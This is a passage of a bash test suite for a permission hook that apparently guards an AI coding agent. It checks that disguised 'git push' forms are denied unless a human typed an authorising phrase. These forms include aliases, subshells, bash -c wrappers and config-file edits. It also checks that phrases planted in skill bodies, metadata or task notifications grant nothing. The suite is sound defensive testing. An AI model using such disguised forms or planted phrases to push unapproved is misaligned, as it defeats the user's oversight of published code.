        add_deny "order v2.7.3: deny && ask | $d && $a" "$d && $a"
    done
done
# Two prompting commands still prompt (nothing to deny).
add_ask "order v2.7.3: two asks"             "rm build.log && npm install"
add_ask "order v2.7.3: three asks"           "gh pr create --title t --body b; docker compose up -d && echo x > out.txt"

# ── v2.7.3 git push: `push` must end the word ─────────────────────────────────
add_allow "push v2.7.3: git push-notes is another command" "git push-notes"
add_allow "push v2.7.3: -C repo push-notes (asks, no deny)" "git -C repo push-notes"
add_allow "push v2.7.3: --no-pager push_x"                  "git --no-pager push_x"
add_deny  "push v2.7.3: push;"                              "git push;echo done"
add_deny  "push v2.7.3: push&&"                             "git push&&echo done"
add_deny  "push v2.7.3: push in bash -c double quotes"      "bash -c \"git push\""
add_deny  "push v2.7.3: push in a subshell"                 "(git push)"
add_deny  "push v2.7.3: push in \$( )"                      "echo \$(git push)"

# ── v2.7.3 git alias that pushes: defining one ────────────────────────────────
# (Using one is tested further down, against a fixture git config.)
add_deny  "alias v2.7.3: git config alias.p push"           "git config alias.p push"
add_deny  "alias v2.7.3: --global"                          "git config --global alias.p push"
add_deny  "alias v2.7.3: git config set (git 2.46+)"        "git config set alias.p push"
add_deny  "alias v2.7.3: -c alias.p=push p"                 "git -c alias.p=push p"
add_deny  "alias v2.7.3: -c quoted shell alias"             "git -c 'alias.p=!git push' p"
add_deny  "alias v2.7.3: shell alias, sh -c"                "git config alias.p '!sh -c \"git push\"'"
add_deny  "alias v2.7.3: [alias] section into a file"       $'cat >> ~/.gitconfig <<\'EOF\'\n[alias]\n\tp = push\nEOF'
add_deny  "alias v2.7.3: [alias] via printf"                "printf '[alias]\\n\\tp = push\\n' >> .git/config"
add_deny  "alias v2.7.3: after an ask"                      "gh pr create --title t --body b && git config alias.p push"
add_deny  "alias v2.7.3: [alias] via tee into ~/.config/git" $'tee -a ~/.config/git/config <<\'EOF\'\n[alias]\n  pp = push\nEOF'
add_allow "alias v2.7.3: [alias] only in a commit message"  $'git commit -F - <<\'EOF\'\ndocs: an [alias] section with push in .gitconfig is blocked\nEOF'
add_allow "alias v2.7.3: alias without push"                "git config alias.co checkout"
add_allow "alias v2.7.3: list aliases"                      "git config --get-regexp alias"
add_allow "alias v2.7.3: commit message mentions it"        "git commit -m \"block git config alias.p push\""

# ── runner ────────────────────────────────────────────────────────────────────
pass=0; fail=0; fail_details=()
for t in "${TESTS_ALLOW[@]}"; do
    label="${t%%	*}"; cmd="${t#*	}"
    run_hook "$cmd"; ec=$?
    if [[ $ec -eq 2 ]]; then
        fail=$((fail+1)); fail_details+=("[ALLOW expected, DENIED] $label | cmd: ${cmd:0:120}")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: $label"
    else
        pass=$((pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: $label"
    fi
done
allow_pass=$pass; allow_fail=$fail; allow_total=${#TESTS_ALLOW[@]}

pass=0; fail=0
for t in "${TESTS_DENY[@]}"; do
    label="${t%%	*}"; cmd="${t#*	}"
    run_hook "$cmd"; ec=$?
    if [[ $ec -eq 2 ]]; then
        pass=$((pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: $label"
    else
        fail=$((fail+1)); fail_details+=("[DENY expected, PASSED] $label | cmd: ${cmd:0:120}")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: $label"
    fi
done
deny_pass=$pass; deny_fail=$fail; deny_total=${#TESTS_DENY[@]}

pass=0; fail=0
for t in "${TESTS_ASK[@]}"; do
    label="${t%%	*}"; cmd="${t#*	}"
    if run_hook_ask "$cmd"; then
        pass=$((pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: $label"
    else
        fail=$((fail+1)); fail_details+=("[ASK expected, NOT asked] $label | cmd: ${cmd:0:120}")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: $label"
    fi
done
ask_pass=$pass; ask_fail=$fail; ask_total=${#TESTS_ASK[@]}

# v2.7.3: the ask is emitted once, at the end, with the FIRST guard's reason
# (the reason a user saw before v2.7.3, when ask() exited on the spot).
declare -a TESTS_ASK_REASON=(
    "curl -X POST https://x.test && rm y"$'\t'"curl write operation"
    "rm y && curl -X POST https://x.test"$'\t'"curl write operation"
    "gh pr create --title t --body b && npm install"$'\t'"gh write operation"
    "npm install && echo x > out.txt"$'\t'"Package manager install"
    "echo x > out.txt && ln -s a b"$'\t'"Output redirection"
    "git -C repo commit -m x && docker compose up -d"$'\t'"docker write"
)
for t in "${TESTS_ASK_REASON[@]}"; do
    c="${t%%	*}"; want="${t#*	}"
    out=$(jq -c -n --arg cmd "$c" '{tool_input:{command:$cmd}, transcript_path:""}' | bash "$HOOK" 2>/dev/null); ec=$?
    n=$(printf '%s\n' "$out" | grep -c '"permissionDecision"')
    if [[ $ec -eq 0 && $n -eq 1 ]] && grep -q '"permissionDecision":"ask"' <<<"$out" && grep -qF "$want" <<<"$out"; then
        ask_pass=$((ask_pass+1)); [[ $VERBOSE -eq 1 ]] && echo "PASS: ask reason → $c"
    else
        ask_fail=$((ask_fail+1)); fail_details+=("[ASK REASON '$want' expected once, got ec=$ec lines=$n] $c | ${out:0:160}")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: ask reason → $c"
    fi
    ask_total=$((ask_total+1))
done

# ── git push auth-phrase tests ────────────────────────────────────────────────
# Verify that git_push_authorized() consults the last *human-typed* user message,
# skipping intervening tool_result entries that Claude Code emits between turns.
# Regression for the bug where a tool_result became the most-recent user-role
# entry and the auth phrase was permanently lost within the session.

declare -a TESTS_PUSH_ALLOW TESTS_PUSH_DENY
add_push_allow() { TESTS_PUSH_ALLOW+=("$1"$'\t'"$2"); }
add_push_deny()  { TESTS_PUSH_DENY+=("$1"$'\t'"$2"); }

# Build a JSONL transcript fixture from a list of layout tokens. The shapes
# mirror what Claude Code actually writes to the transcript. Tokens:
#   user:<text>          → user-role message with one text content block
#   user_image:<text>    → human message with a pasted image: image block + text block
#   image_meta           → the isMeta entry Claude Code appends after a pasted
#                          image ("[Image: source: …/images/1.png]")
#   command:<name>|<args> → typed slash command, stored as a string content
#                          (<command-message>/<command-name>/<command-args>)
#   skill_meta:<text>    → the isMeta entry holding the loaded skill body
#   task_notification:<text> → string content emitted when a background task ends
#   attachment           → non-message transcript entry (hook output, reminders)
#   tool_result          → user-role message with one tool_result content block
#   assistant:<text>     → assistant-role message (filler; not used by the hook)
make_transcript() {
    local out="$1"; shift
    : > "$out"
    local tok kind body
    for tok in "$@"; do
        kind="${tok%%:*}"
        body="${tok#*:}"
        case "$kind" in
            user)
                jq -nc --arg t "$body" '{type:"user", message:{role:"user", content:[{type:"text", text:$t}]}}' >> "$out"
                ;;
            user_image)
                jq -nc --arg t "$body" '{type:"user", message:{role:"user", content:[{type:"image", source:{type:"base64", media_type:"image/png", data:"iVBORw0KGgo="}}, {type:"text", text:$t}]}}' >> "$out"
                ;;
            image_meta)
                jq -nc '{type:"user", isMeta:true, message:{role:"user", content:[{type:"text", text:"[Image: source: /tmp/claude-1000/project/session/images/1.png]"}]}}' >> "$out"
                ;;
            command)
                jq -nc --arg n "${body%%|*}" --arg a "${body#*|}" '{type:"user", message:{role:"user", content:("<command-message>" + ($n | ltrimstr("/")) + "</command-message>\n<command-name>" + $n + "</command-name>\n<command-args>" + $a + "</command-args>")}}' >> "$out"
                ;;
            skill_meta)
                jq -nc --arg t "$body" '{type:"user", isMeta:true, message:{role:"user", content:[{type:"text", text:("Base directory for this skill: /home/u/.claude/skills/x\n\n" + $t)}]}}' >> "$out"
                ;;
            task_notification)
                jq -nc --arg t "$body" '{type:"user", message:{role:"user", content:("<task-notification>\n<task-id>a1</task-id>\n<result>" + $t + "</result>\n</task-notification>")}}' >> "$out"
                ;;
            attachment)
                jq -nc '{type:"attachment", attachment:{type:"hook_success", content:"ok"}}' >> "$out"
                ;;
            tool_result)
                jq -nc '{type:"user", message:{role:"user", content:[{type:"tool_result", tool_use_id:"x", content:"output"}]}}' >> "$out"
                ;;
            assistant)
                jq -nc --arg t "$body" '{type:"assistant", message:{role:"assistant", content:[{type:"text", text:$t}]}}' >> "$out"
                ;;
        esac
    done
}

# Run the hook against a `git push` invocation with a synthetic transcript.
# Returns 0 if the hook allowed, 2 if the hook hard-denied.
run_push_with_transcript() {
    local transcript="$1"
    jq -c -n --arg cmd "git push origin main" --arg tp "$transcript" \
        '{tool_input:{command:$cmd}, transcript_path:$tp}' \
        | bash "$HOOK" >/dev/null 2>&1
    return $?
}

PUSH_TMP="$(mktemp -d)"
trap 'rm -rf "$PUSH_TMP" "${SCRIPT_TMP:-}"' EXIT

# Layout A — bug fixture: user said "please git push", then Claude ran a tool
# (one tool_result entry now sits as the most recent user-role message). The
# pre-fix hook saw an empty string here and denied; post-fix must allow.
make_transcript "$PUSH_TMP/a.jsonl" \
    "user:please git push origin main" \
    "assistant:running" \
    "tool_result"
add_push_allow "auth phrase persists across one tool_result" "$PUSH_TMP/a.jsonl"

# Layout B — auth phrase as the immediate last user message (the only case the
# pre-fix hook honoured). Must remain allowed.
make_transcript "$PUSH_TMP/b.jsonl" "user:please git push"
add_push_allow "auth phrase is the last user message" "$PUSH_TMP/b.jsonl"

# Layout C — auth phrase, tool noise, auth phrase again (still allowed).
make_transcript "$PUSH_TMP/c.jsonl" \
    "user:please git push" \
    "tool_result" \
    "user:please git push"
add_push_allow "auth phrase after multiple tool_results" "$PUSH_TMP/c.jsonl"

# Layout D — auth phrase mid-message; still allowed (we read the full body).
make_transcript "$PUSH_TMP/d.jsonl" \
    "user:do steps 1, 2, then please git push" \
    "tool_result"
add_push_allow "auth phrase mid-message" "$PUSH_TMP/d.jsonl"

# Layout E — auth phrase superseded by a later user message (revocation).
make_transcript "$PUSH_TMP/e.jsonl" \
    "user:please git push" \
    "tool_result" \
    "user:wait, hold off"
add_push_deny "auth phrase superseded by later user message" "$PUSH_TMP/e.jsonl"

# Layout F — no auth phrase anywhere.
make_transcript "$PUSH_TMP/f.jsonl" \
    "user:please look at this PR" \
    "tool_result"
add_push_deny "no auth phrase in any user message" "$PUSH_TMP/f.jsonl"

# Layout G — empty transcript (no user messages at all).
: > "$PUSH_TMP/g.jsonl"
add_push_deny "empty transcript" "$PUSH_TMP/g.jsonl"

# Layout H — only tool_result entries (no human-typed text anywhere).
make_transcript "$PUSH_TMP/h.jsonl" "tool_result" "tool_result"
add_push_deny "transcript has only tool_results" "$PUSH_TMP/h.jsonl"

# Layout I — bug fixture: the auth phrase arrives in a message with a pasted
# image. Claude Code appends an isMeta "[Image: source: …]" entry right after
# it; the pre-fix hook took that entry as the last human message and denied.
make_transcript "$PUSH_TMP/i.jsonl" \
    "user_image:zie afbeelding, daarna commit and push" \
    "image_meta" \
    "attachment" \
    "assistant:running" \
    "tool_result"
add_push_allow "auth phrase in a message with a pasted image" "$PUSH_TMP/i.jsonl"

# Layout J — a later image message without the phrase still revokes.
make_transcript "$PUSH_TMP/j.jsonl" \
    "user:please git push" \
    "tool_result" \
    "user_image:wacht, zie eerst deze afbeelding" \
    "image_meta"
add_push_deny "later image message without phrase supersedes auth" "$PUSH_TMP/j.jsonl"

# Layout K — auth phrase in the arguments of a typed slash command. The
# command is a string-content entry and the skill body follows as isMeta; the
# pre-fix hook skipped the former and read the latter.
make_transcript "$PUSH_TMP/k.jsonl" \
    "command:/opsx-apply|WOO-1, push for me when done" \
    "skill_meta:# Apply" \
    "assistant:running" \
    "tool_result"
add_push_allow "auth phrase in slash-command arguments" "$PUSH_TMP/k.jsonl"

# Layout L — a slash command without the phrase revokes an earlier auth. With
# isMeta skipped but string content still ignored, the old phrase would leak.
make_transcript "$PUSH_TMP/l.jsonl" \
    "user:please git push" \
    "tool_result" \
    "command:/review-pr|https://github.com/o/r/pull/1" \
    "skill_meta:# PR Review"
add_push_deny "later slash command without phrase supersedes auth" "$PUSH_TMP/l.jsonl"

# Layout M — a skill body that itself mentions a phrase must not authorize;
# the human never typed it. The pre-fix hook allowed this.
make_transcript "$PUSH_TMP/m.jsonl" \
    "command:/review-pr|https://github.com/o/r/pull/1" \
    "skill_meta:Step 9: commit and push the fixes"
add_push_deny "auth phrase only inside a skill body" "$PUSH_TMP/m.jsonl"

# Layout N — an image-source path that happens to contain a phrase is not
# human text either (defence against the meta entry ever carrying one).
make_transcript "$PUSH_TMP/n.jsonl" \
    "user_image:zie afbeelding" \
    "image_meta"
jq -nc '{type:"user", isMeta:true, message:{role:"user", content:[{type:"text", text:"[Image: source: /tmp/push my changes/1.png]"}]}}' >> "$PUSH_TMP/n.jsonl"
add_push_deny "auth phrase only inside an isMeta entry" "$PUSH_TMP/n.jsonl"

# Layout O — a background-task notification is not human input: it neither
# grants auth nor revokes an auth the human gave before it arrived.
make_transcript "$PUSH_TMP/o.jsonl" \
    "user:push my changes" \
    "tool_result" \
    "task_notification:agent finished"
add_push_allow "task notification does not revoke auth" "$PUSH_TMP/o.jsonl"

make_transcript "$PUSH_TMP/p.jsonl" \
    "user:kijk naar de output" \
    "task_notification:done, please git push next"
add_push_deny "auth phrase only inside a task notification" "$PUSH_TMP/p.jsonl"

push_pass=0; push_fail=0
for t in "${TESTS_PUSH_ALLOW[@]}"; do
    label="${t%%	*}"; transcript="${t#*	}"
    run_push_with_transcript "$transcript"; ec=$?
    if [[ $ec -eq 2 ]]; then
        push_fail=$((push_fail+1)); fail_details+=("[PUSH ALLOW expected, DENIED] $label")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: push allow → $label"
    else
        push_pass=$((push_pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: push allow → $label"
    fi
done
for t in "${TESTS_PUSH_DENY[@]}"; do
    label="${t%%	*}"; transcript="${t#*	}"
    run_push_with_transcript "$transcript"; ec=$?
    if [[ $ec -eq 2 ]]; then
        push_pass=$((push_pass+1))
        [[ $VERBOSE -eq 1 ]] && echo "PASS: push deny → $label"
    else
        push_fail=$((push_fail+1)); fail_details+=("[PUSH DENY expected, ALLOWED] $label")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: push deny → $label"
    fi
done
# v2.7.2: with the phrase, a push chained after a command that prompts no
# longer short-circuits that prompt — the hook still asks for the other part.
# Without the phrase, the same command is denied (not asked).
declare -a TESTS_PUSH_AUTH_ASK=(
    "git -C repo commit -m x && git push"
    "gh pr create --title t --body b && git push"
    "git -C repo add . && git -C repo push origin main"
)
run_cmd_with_transcript() { # args: cmd transcript → prints hook output, returns hook exit code
    jq -c -n --arg cmd "$1" --arg tp "$2" '{tool_input:{command:$cmd}, transcript_path:$tp}' \
        | bash "$HOOK" 2>/dev/null
}
push_extra=0
for c in "${TESTS_PUSH_AUTH_ASK[@]}"; do
    out=$(run_cmd_with_transcript "$c" "$PUSH_TMP/b.jsonl"); ec=$?
    if [[ $ec -eq 0 ]] && grep -q '"permissionDecision":"ask"' <<<"$out"; then
        push_pass=$((push_pass+1)); [[ $VERBOSE -eq 1 ]] && echo "PASS: push auth+ask → $c"
    else
        push_fail=$((push_fail+1)); fail_details+=("[PUSH AUTH ASK expected, got ec=$ec] $c")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: push auth+ask → $c"
    fi
    run_cmd_with_transcript "$c" "$PUSH_TMP/f.jsonl" >/dev/null; ec=$?
    if [[ $ec -eq 2 ]]; then
        push_pass=$((push_pass+1)); [[ $VERBOSE -eq 1 ]] && echo "PASS: push no-auth deny → $c"
    else
        push_fail=$((push_fail+1)); fail_details+=("[PUSH DENY expected, got ec=$ec] no phrase: $c")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: push no-auth deny → $c"
    fi
    push_extra=$((push_extra+2))
done
for c in "git -c user.name=x push" "git --no-pager push origin main"; do
    run_cmd_with_transcript "$c" "$PUSH_TMP/b.jsonl" >/dev/null; ec=$?
    if [[ $ec -ne 2 ]]; then
        push_pass=$((push_pass+1)); [[ $VERBOSE -eq 1 ]] && echo "PASS: push auth allow → $c"
    else
        push_fail=$((push_fail+1)); fail_details+=("[PUSH ALLOW expected, DENIED] phrase given: $c")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: push auth allow → $c"
    fi
    push_extra=$((push_extra+1))
done

# v2.7.3: a git alias that resolves to push is a push. Fixture config, read
# through GIT_CONFIG_GLOBAL so the developer's own ~/.gitconfig plays no part;
# the hook gets the session cwd from the payload, as Claude Code sends it.
ALIAS_TMP="$PUSH_TMP/alias"
mkdir -p "$ALIAS_TMP/repo"
cat > "$ALIAS_TMP/gitconfig" <<'CFG'
[alias]
	p = push
	pp = p
	ppp = pp
	c1 = c2
	c2 = c3
	c3 = c4
	c4 = c5
	c5 = c6
	c6 = push
	sp = !git push origin
	fn = "!f() { git fetch && git push; }; f"
	opt = -c core.x=y push
	status = push
	pn = push-notes
	lg = log --oneline
	co = checkout
CFG
git -C "$ALIAS_TMP/repo" init -q 2>/dev/null
git -C "$ALIAS_TMP/repo" config alias.lp push
run_alias() { # args: cmd cwd transcript → prints hook output, returns hook exit code
    jq -c -n --arg cmd "$1" --arg d "$2" --arg tp "${3:-}" \
        '{tool_input:{command:$cmd}, transcript_path:$tp, cwd:$d}' \
        | GIT_CONFIG_GLOBAL="$ALIAS_TMP/gitconfig" GIT_CONFIG_NOSYSTEM=1 bash "$HOOK" 2>/dev/null
}
# cmd <TAB> cwd <TAB> expected (deny | pass | ask) [<TAB> transcript]
declare -a TESTS_ALIAS=(
    "git p"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git pp origin main"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git ppp"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git c1"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git sp"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git fn"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git opt"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git P"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "cd sub && git p"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git -c user.name=x p"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git --no-pager pp"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "bash -c 'git p'"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "gh pr create --title t --body b && git p"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git -C repo commit -m x && git -C repo lp"$'\t'"$ALIAS_TMP"$'\t'"deny"
    "git lp"$'\t'"$ALIAS_TMP/repo"$'\t'"deny"
    "git -C $ALIAS_TMP/repo lp"$'\t'"/"$'\t'"deny"
    "git status"$'\t'"$ALIAS_TMP"$'\t'"pass"
    "git lg"$'\t'"$ALIAS_TMP"$'\t'"pass"
    "git co main"$'\t'"$ALIAS_TMP"$'\t'"pass"
    "git pn"$'\t'"$ALIAS_TMP"$'\t'"pass"
    "git lp"$'\t'"$ALIAS_TMP"$'\t'"pass"
    "git commit -m \"run git p later\""$'\t'"$ALIAS_TMP"$'\t'"pass"
    "git p"$'\t'"$ALIAS_TMP"$'\t'"pass"$'\t'"$PUSH_TMP/b.jsonl"
    "git -C repo lp"$'\t'"$ALIAS_TMP"$'\t'"ask"$'\t'"$PUSH_TMP/b.jsonl"
    "gh pr create --title t --body b && git p"$'\t'"$ALIAS_TMP"$'\t'"ask"$'\t'"$PUSH_TMP/b.jsonl"
    "git p"$'\t'"$ALIAS_TMP"$'\t'"deny"$'\t'"$PUSH_TMP/f.jsonl"
)
for t in "${TESTS_ALIAS[@]}"; do
    IFS=$'\t' read -r c d want tp <<<"$t"
    out=$(run_alias "$c" "$d" "${tp:-}"); ec=$?
    got=pass
    [[ $ec -eq 2 ]] && got=deny
    [[ $ec -eq 0 ]] && grep -q '"permissionDecision":"ask"' <<<"$out" && got=ask
    if [[ "$got" == "$want" ]]; then
        push_pass=$((push_pass+1)); [[ $VERBOSE -eq 1 ]] && echo "PASS: alias $want → $c"
    else
        push_fail=$((push_fail+1)); fail_details+=("[ALIAS $want expected, got $got] $c (cwd ${d})")
        [[ $VERBOSE -eq 1 ]] && echo "FAIL: alias $want → $c"
    fi
    push_extra=$((push_extra+1))
done
push_total=$(( ${#TESTS_PUSH_ALLOW[@]} + ${#TESTS_PUSH_DENY[@]} + push_extra ))

total=$((allow_total + deny_total + ask_total + push_total))
total_pass=$((allow_pass + deny_pass + ask_pass + push_pass))
total_fail=$((allow_fail + deny_fail + ask_fail + push_fail))

echo
echo "═══════════════════════════════════════════════════════════"
echo "HOOK:   $HOOK"
echo "TOTAL:  $total"
echo "  ALLOW expected: $allow_total  (pass=$allow_pass, fail=$allow_fail)"
echo "  DENY  expected: $deny_total  (pass=$deny_pass,  fail=$deny_fail)"
echo "  ASK   expected: $ask_total   (pass=$ask_pass,   fail=$ask_fail)"
echo "  PUSH  auth:     $push_total  (pass=$push_pass,  fail=$push_fail)"
echo "  OVERALL:        $total_pass / $total"
echo "═══════════════════════════════════════════════════════════"

if [[ $total_fail -gt 0 ]]; then
    echo
    echo "FAILURES (${#fail_details[@]} — first 40 shown):"
    printf '  %s\n' "${fail_details[@]}" | head -40
    exit 1
fi
exit 0
